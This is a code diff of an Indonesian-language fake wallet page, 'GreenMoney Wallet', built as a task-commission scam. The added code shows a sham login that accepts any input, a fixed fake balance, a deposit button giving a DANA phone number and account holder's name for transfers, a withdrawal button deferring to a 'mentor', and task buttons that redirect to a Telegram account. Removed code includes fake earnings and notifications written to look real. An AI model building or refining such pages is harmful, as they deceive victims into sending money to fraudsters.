@@ -3,6 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <title>GreenMoney Wallet</title>
+
 <style>
 body {
     background: linear-gradient(90deg, #2b2100, #ffd700);
@@ -33,8 +34,12 @@ button {
     cursor: pointer;
 }
 
-button:hover {
-    opacity: 0.8;
+input {
+    padding: 10px;
+    margin: 5px;
+    border-radius: 8px;
+    border: none;
+    width: 80%;
 }
 
 .balance {
@@ -43,18 +48,24 @@ button:hover {
     font-weight: bold;
 }
 
-.log {
-    font-size: 12px;
-    text-align: left;
-    max-height: 150px;
-    overflow-y: auto;
+.hidden {
+    display: none;
 }
 </style>
 </head>
 
 <body>
 
-<div class="container">
+<!-- LOGIN -->
+<div id="loginPage" class="container">
+    <h2>Login Wallet 🔐</h2>
+    <input type="text" id="user" placeholder="ID"><br>
+    <input type="password" id="pass" placeholder="Password"><br>
+    <button onclick="login()">Login</button>
+</div>
+
+<!-- APP -->
+<div id="app" class="container hidden">
 
 <h1 style="color:gold;">GreenMoney Wallet 💚</h1>
 
@@ -68,20 +79,22 @@ button:hover {
 
 <div class="card">
     <h3>Menu Tugas</h3>
-    <button onclick="kerjakan(10000)">Tugas 1</button>
-    <button onclick="kerjakan(15000)">Tugas 2</button>
-    <button onclick="kerjakan(20000)">Tugas 3</button>
-    <button onclick="kerjakan(25000)">Tugas VIP</button>
+    <button onclick="tugas()">Tugas 1</button>
+    <button onclick="tugas()">Tugas 2</button>
+    <button onclick="tugas()">Tugas 3</button>
+    <button onclick="tugas()">Tugas VIP</button>
 </div>
 
 <div class="card">
-    <h3>Riwayat Transaksi</h3>
-    <div class="log" id="log"></div>
-</div>
-
-<div class="card">
-    <h3>Notifikasi</h3>
-    <div id="notif">Selamat datang 👋</div>
+    <h3>NOTICE ⚠️</h3>
+    <p style="font-size:12px;">
+    Penyelesaian tugas hanya dari mentor anda <br><br>
+    selesaikan tugas anda dan kembali ke mentor untuk konfirmasi penarikan!! <br><br>
+    Ambil tugas yang tersedia di dalam grup <br><br>
+    Isi coin melalui transfer nomor tujuan yang tersedia <br><br>
+    Pilih tugas dan kembali ke mentor <br><br>
+    Segera lakukan penarikan komisi dengan cara menyelesaikan tugas anda!!!
+    </p>
 </div>
 
 </div>
@@ -89,68 +102,43 @@ button:hover {
 <script>
 let saldo = 100000;
 
+// LOGIN
+function login(){
+    let user = document.getElementById("user").value;
+    let pass = document.getElementById("pass").value;
+
+    if(user && pass){
+        document.getElementById("loginPage").classList.add("hidden");
+        document.getElementById("app").classList.remove("hidden");
+    } else {
+        alert("Isi ID dan Password!");
+    }
+}
+
+// FORMAT
 function formatRupiah(angka){
     return "Rp " + angka.toLocaleString("id-ID");
 }
 
+// UPDATE SALDO
 function updateSaldo(){
     document.getElementById("saldo").innerText = formatRupiah(saldo);
 }
 
-function tambahLog(text){
-    let log = document.getElementById("log");
-    let waktu = new Date().toLocaleTimeString();
-    log.innerHTML = `<div>[${waktu}] ${text}</div>` + log.innerHTML;
-}
-
-function notif(text){
-    document.getElementById("notif").innerText = text;
-}
-
+// DEPOSIT
 function deposit(){
-    let jumlah = 50000;
-    saldo += jumlah;
-    updateSaldo();
-    tambahLog("Deposit +" + formatRupiah(jumlah));
-    notif("Deposit berhasil ✅");
+    alert("Transfer ke:\nDANA 089699863373\nAGRIFA ALOKENIA GINTING");
 }
 
+// TARIK
 function tarik(){
-    if(saldo < 50000){
-        notif("Saldo tidak cukup ❌");
-        return;
-    }
-
-    let jumlah = 50000;
-    saldo -= jumlah;
-    updateSaldo();
-    tambahLog("Tarik -" + formatRupiah(jumlah));
-    notif("Penarikan diproses ⏳");
+    alert("Hubungi mentor anda untuk melakukan penarikan.");
 }
 
-function kerjakan(bayar){
-    notif("Mengerjakan tugas...");
-    
-    setTimeout(() => {
-        saldo += bayar;
-        updateSaldo();
-        tambahLog("Komisi +" + formatRupiah(bayar));
-        notif("Tugas selesai ✅");
-    }, 2000);
+// TUGAS → TELEGRAM
+function tugas(){
+    window.location.href = "https://t.me/robertelchico";
 }
-
-// Fake notifikasi biar terlihat real
-setInterval(() => {
-    let random = Math.floor(Math.random() * 5);
-    let pesan = [
-        "User lain berhasil withdraw 💸",
-        "Bonus harian tersedia 🎁",
-        "Tugas baru tersedia 🔥",
-        "Saldo bertambah otomatis 💰",
-        "VIP upgrade tersedia ⭐"
-    ];
-    notif(pesan[random]);
-}, 5000);
 
 updateSaldo();
 </script>
